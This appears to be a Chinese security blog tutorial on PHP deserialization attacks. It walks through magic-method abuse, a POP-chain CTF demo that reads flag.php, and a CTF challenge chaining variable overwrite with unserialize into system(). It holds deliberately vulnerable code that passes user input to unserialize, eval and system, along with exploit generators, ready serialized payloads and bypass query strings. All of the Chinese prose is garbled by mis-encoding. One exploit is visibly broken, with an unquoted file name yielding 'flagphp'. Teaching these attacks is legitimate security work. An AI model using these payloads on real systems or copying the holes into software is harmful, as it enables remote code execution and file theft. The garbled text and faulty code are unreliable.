<p>é­”æ³•æ­£å¦‚ä¸Šé¢ä»‹ç»çš„ï¼Œé­”æ³•æ–¹æ³•çš„è°ƒç”¨æ˜¯åœ¨è¯¥ç±»åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–çš„åŒæ—¶è‡ªåŠ¨å®Œæˆçš„ï¼Œä¸éœ€è¦äººå·¥å¹²é¢„ï¼Œè¿™å°±éå¸¸ç¬¦åˆæˆ‘ä»¬çš„æƒ³æ³•ï¼Œå› æ­¤åªè¦é­”æ³•æ–¹æ³•ä¸­å‡ºç°äº†ä¸€äº›æˆ‘ä»¬èƒ½åˆ©ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡ååºåˆ—åŒ–ä¸­å¯¹å…¶å¯¹è±¡å±æ€§çš„æ“æ§æ¥å®ç°å¯¹è¿™äº›å‡½æ•°çš„æ“æ§ï¼Œè¿›è€Œè¾¾åˆ°æˆ‘ä»¬å‘åŠ¨æ”»å‡»çš„ç›®çš„ã€‚</p>
<h3 id="é­”æ³•æ–¹æ³•çš„ç®€å•åˆ©ç”¨">é­”æ³•æ–¹æ³•çš„ç®€å•åˆ©ç”¨</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;i am ca01h&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> L();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;function action() in class L&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæˆ‘ä»¬èƒ½çœ‹åˆ°<code>unserialize()</code>å‡½æ•°çš„å‚æ•°æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½é€šè¿‡è¿™ä¸ªæ¥å£ååºåˆ—åŒ–ä»»ä½•ç±»çš„å¯¹è±¡(ä½†åªæœ‰åœ¨å½“å‰ä½œç”¨åŸŸçš„ç±»æ‰å¯¹æˆ‘ä»¬æœ‰ç”¨)ï¼Œé‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹å½“å‰è¿™ä¸‰ä¸ªç±»ï¼Œæˆ‘ä»¬çœ‹åˆ°åé¢ä¸¤ä¸ªç±»ååºåˆ—åŒ–ä»¥åå¯¹æˆ‘ä»¬æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œå› ä¸ºæˆ‘ä»¬æ ¹æœ¬æ²¡æ³•è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªç±»å°±ä¸ä¸€æ ·äº†ï¼Œè™½ç„¶æˆ‘ä»¬ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä»£ç èƒ½å®ç°è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ä»–æœ‰ä¸€ä¸ªé­”æ³•å‡½æ•°<code> __destruct()</code> ï¼Œè¿™å°±éå¸¸æœ‰è¶£äº†ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°èƒ½åœ¨å¯¹è±¡é”€æ¯çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¸ç”¨æˆ‘ä»¬äººå·¥çš„å¹²é¢„ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹æ€ä¹ˆåˆ©ç”¨ã€‚</p>
<p>æˆ‘ä»¬çœ‹åˆ°<code>__destruct()</code>é‡Œé¢åªç”¨åˆ°äº†ä¸€ä¸ªå±æ€§<code>test</code>ï¼Œå†è§‚å¯Ÿä¸€ä¸‹ é‚£äº›åœ°æ–¹è°ƒç”¨äº†<code>action()</code>å‡½æ•°ï¼Œçœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ä¸­æœ‰æ²¡æœ‰å­˜åœ¨æ‰§è¡Œå‘½ä»¤æˆ–è€…æ˜¯å…¶ä»–æˆ‘ä»¬èƒ½åˆ©ç”¨çš„ç‚¹çš„ï¼Œæœç„¶åœ¨ <code>Evil</code> è¿™ä¸ªç±»ä¸­å‘ç°ä»–çš„ <code>action() </code>å‡½æ•°è°ƒç”¨äº†<code> eval()</code>,é‚£æˆ‘ä»¬çš„æƒ³æ³•å°±å¾ˆæ˜ç¡®äº†ï¼Œåªéœ€è¦å°†<code>demo</code>è¿™ä¸ªç±»ä¸­çš„<code>test</code>å±æ€§ç¯¡æ”¹ä¸º <code>Evil </code>è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œç„¶åä¸ºäº†<code> eval</code> èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬è¿˜è¦ç¯¡æ”¹<code>Evil</code>å¯¹è±¡çš„<code> test2</code> å±æ€§ï¼Œå°†å…¶æ”¹æˆè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> Evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2 = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$demo = <span class="keyword">new</span> demo();</span><br><span class="line">$data = serialize($demo);</span><br><span class="line">var_dump($data);</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºçš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;demo&quot;:1:&#123;s:10:&quot;\000demo\000test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:9:&quot;phpinfo()&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªç®€å•çš„PHPååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚</p>
<p><strong>é€šè¿‡è¿™ä¸ªç®€å•çš„ä¾‹å­æ€»ç»“ä¸€ä¸‹å¯»æ‰¾ PHP ååºåˆ—åŒ–æ¼æ´çš„æ–¹æ³•æˆ–è€…æµç¨‹</strong></p>
<p>(1)å¯»æ‰¾<code>unserialize()</code>å‡½æ•°çš„å‚æ•°æ˜¯å¦æœ‰æˆ‘ä»¬çš„å¯æ§ç‚¹ï¼›<br>
(2)å¯»æ‰¾æˆ‘ä»¬çš„ååºåˆ—åŒ–çš„ç›®æ ‡ï¼Œé‡ç‚¹å¯»æ‰¾å­˜åœ¨ <code>wakeup()</code> æˆ– <code>destruct()</code> é­”æ³•å‡½æ•°çš„ç±»ï¼›<br>
(3)<strong>ä¸€å±‚ä¸€å±‚</strong>åœ°ç ”ç©¶è¯¥ç±»åœ¨é­”æ³•æ–¹æ³•ä¸­ä½¿ç”¨çš„å±æ€§å’Œå±æ€§è°ƒç”¨çš„æ–¹æ³•ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å¯æ§çš„å±æ€§èƒ½å®ç°åœ¨å½“å‰è°ƒç”¨çš„è¿‡ç¨‹ä¸­è§¦å‘çš„ï¼›<br>
(4)æ‰¾åˆ°æˆ‘ä»¬è¦æ§åˆ¶çš„å±æ€§äº†ä»¥åæˆ‘ä»¬å°±å°†è¦ç”¨åˆ°çš„ä»£ç éƒ¨åˆ†å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åæ„é€ åºåˆ—åŒ–ï¼Œå‘èµ·æ”»å‡»ã€‚</p>
<h2 id="0x03-PHPååºåˆ—åŒ–POPé“¾">0x03 PHPååºåˆ—åŒ–POPé“¾</h2>
<h3 id="POPé“¾ä»‹ç»">POPé“¾ä»‹ç»</h3>
<p>POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯<strong>ä»ç°æœ‰è¿è¡Œç¯å¢ƒ</strong>ä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾,æœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„</p>
<p>è¯´çš„å†å…·ä½“ä¸€ç‚¹å°±æ˜¯ ROP æ˜¯é€šè¿‡æ ˆæº¢å‡ºå®ç°æ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œæµç¨‹ï¼Œè€Œæˆ‘ä»¬çš„ååºåˆ—åŒ–æ˜¯é€šè¿‡æ§åˆ¶å¯¹è±¡çš„å±æ€§ä»è€Œå®ç°æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œè¿›è€Œè¾¾æˆåˆ©ç”¨æœ¬èº«æ— å®³çš„ä»£ç è¿›è¡Œæœ‰å®³æ“ä½œçš„ç›®çš„ã€‚</p>
<h3 id="POPé“¾demo">POPé“¾demo</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) 		 &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯»æ‰¾POPé“¾è¿‡ç¨‹ï¼š</p>
<ul>
<li>66è¡Œä»£ç å¤„æœ‰<code>unserialize()</code>å‡½æ•°ï¼Œè€Œä¸”å‚æ•°å¯æ§ï¼›</li>
<li>åœ¨<code>Show</code>è¿™ä¸ªç±»ä¸­æœ‰<code>__wakeup()</code>æ–¹æ³•ï¼›</li>
<li><code>__wakeup()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>preg_replace()</code>å‡½æ•°ï¼Œå¦‚æœ<code>source</code>å±æ€§æ˜¯æŸä¸€ä¸ªç±»å¯¹è±¡çš„è¯ï¼Œä¼šè§¦å‘<code>__toString()</code>æ–¹æ³•ï¼›</li>
<li>åœ¨<code>Show</code>è¿™ä¸ªç±»ä¸­æœ‰<code>__toString()</code>æ–¹æ³•ï¼›</li>
<li><code>__toSting()</code>æ–¹æ³•ä¸­è¯•å›¾è·å–å±æ€§<code>str</code>ä¸­keyä¸º<code>str</code>çš„å€¼çš„<code>source</code>å±æ€§ï¼Œå¦‚æœ<code>str['str']</code>æ˜¯æŸä¸€ä¸ªç±»å¯¹è±¡çš„è¯ï¼Œä¼šè§¦å‘<code>__get()</code>æ–¹æ³•ï¼›</li>
<li>åœ¨<code>Test</code>è¿™ä¸ªç±»ä¸­æœ‰<code>__get()</code>æ–¹æ³•ï¼›</li>
<li><code>__get()</code>æ–¹æ³•ä¸­ï¼Œå¦‚æœ<code>p</code>å±æ€§æ˜¯æŸä¸€ä¸ªç±»å¯¹è±¡çš„è¯ï¼Œä¼šå‡ºå‘<code>__invoke()</code>æ–¹æ³•ï¼›</li>
<li>åœ¨<code>Read</code>è¿™ä¸ªç±»ä¸­æœ‰<code>__invoke()</code>æ–¹æ³•ï¼›</li>
<li><code>__invoke()</code>æ–¹æ³•ä¸­å°è¯•è¯»å–å¹¶æ‰“å°å±æ€§<code>var</code>çš„æ–‡ä»¶å†…å®¹ï¼Œä¸ºäº†è¯»å–<code>flag.php</code>çš„å†…å®¹ï¼Œå¯ä»¥è®©<code>var = flag.php</code>ã€‚</li>
</ul>
<p>ç”Ÿæˆååºåˆ—åŒ–Payloadçš„expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var = flag.php;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">new</span> Read();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p = $r;</span><br><span class="line">$s-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $t;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br></pre></td></tr></table></figure>
<p>æœ€åå¾—å‡ºæ¥çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:&#123;s:3:&quot;var&quot;;s:7:&quot;flagphp&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>æœ‰å…³PHPååºåˆ—åŒ–çš„åŸºç¡€ç¯‡å°±å†™åˆ°è¿™ï¼Œå½“ç„¶è‚¯å®šä¸æ­¢äºæ­¤ï¼Œæ¥ä¸‹æ¥æ˜¯è¿›é˜¶ç¯‡ï¼Œæ¶‰åŠåˆ°SoapClientååºåˆ—åŒ–ï¼ŒPHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼ŒPharååºåˆ—åŒ–ï¼ŒSessionååºåˆ—åŒ–ï¼Œä»¥åŠæœ€åä¸€ä¸ªVulnHubé¶æœºæ”¶å°¾ã€‚</p>
<h2 id="0x04-ä¸€é“å®ä¾‹">0x04 ä¸€é“å®ä¾‹</h2>
<p>è¯¥é¢˜å‡ºå¤„ï¼š<a href="https://www.cnblogs.com/nul1/p/9928797.html">https://www.cnblogs.com/nul1/p/9928797.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params">$host</span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echos <span class="subst">$host</span>&quot;</span>.$host);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">$var=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line">$bbb=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">$ccc=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $i++;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($var===<span class="string">&quot;give&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($bbb===<span class="string">&quot;me&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($ccc===<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                $come=@$_POST[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                unserialize($come);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="å˜é‡è¦†ç›–æ¼æ´">å˜é‡è¦†ç›–æ¼æ´</h3>
<h4 id="">$$</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $i++;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>?first=doller</code>ç»•è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥</p>
<h4 id="parse-str">parse_str</h4>
<p>å¦‚æœç›´æ¥è¿™æ ·å†™<code>?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flag</code>çš„è¯ï¼ŒPHPè§£æçš„æ˜¯å››ä¸ªå‚æ•°ï¼Œè€Œä¸æ˜¯æˆ‘æƒ³å¾—åˆ°çš„ä¸¤ä¸ªå‚æ•°ï¼šä¸€ä¸ª<code>first</code>å’Œä¸€ä¸ª<code>a</code>ã€‚ä¸è¿‡å¥½åœ¨æœ‰URLç¼–ç è¿™ç§ä¸œè¥¿ï¼Œå¯ä»¥åœ¨è¿™æœ‰æ­§ä¹‰çš„æ—¶å€™æ‰­è½¬å±€åŠ¿ï¼Œæˆ‘ä»¬æŠŠ<code>&amp;</code>è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ ·å­è§£ææ—¶å°±ä¼šè®¤ä¸ºæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²äº†ï¼Œå³ï¼š</p>
<p><code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code></p>
<h3 id="ååºåˆ—åŒ–æ¼æ´">ååºåˆ—åŒ–æ¼æ´</h3>
<p>æŸ¥çœ‹ä»£ç ï¼Œå‘ç°åˆ°äº†ååºåˆ—åŒ–çš„åœ°æ–¹äº†ï¼Œè€Œååºåˆ—åŒ–çš„æ¥æºæ˜¯é€šè¿‡POSTæäº¤çš„comeå‚æ•°ï¼ŒçŸ¥é“äº†è¦ååºåˆ—åŒ–ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¡®å®šè¦ååºåˆ—åŒ–çš„ç±»äº†ã€‚è¿™ä¸ªæºç å°±ä¸€ä¸ªç±»comeï¼Œå¯¹è¿™ä¸ªç±»è¿›è¡Œå®¡è®¡ï¼Œé‡ç‚¹çœ‹<code>__destruct</code>æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">      call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
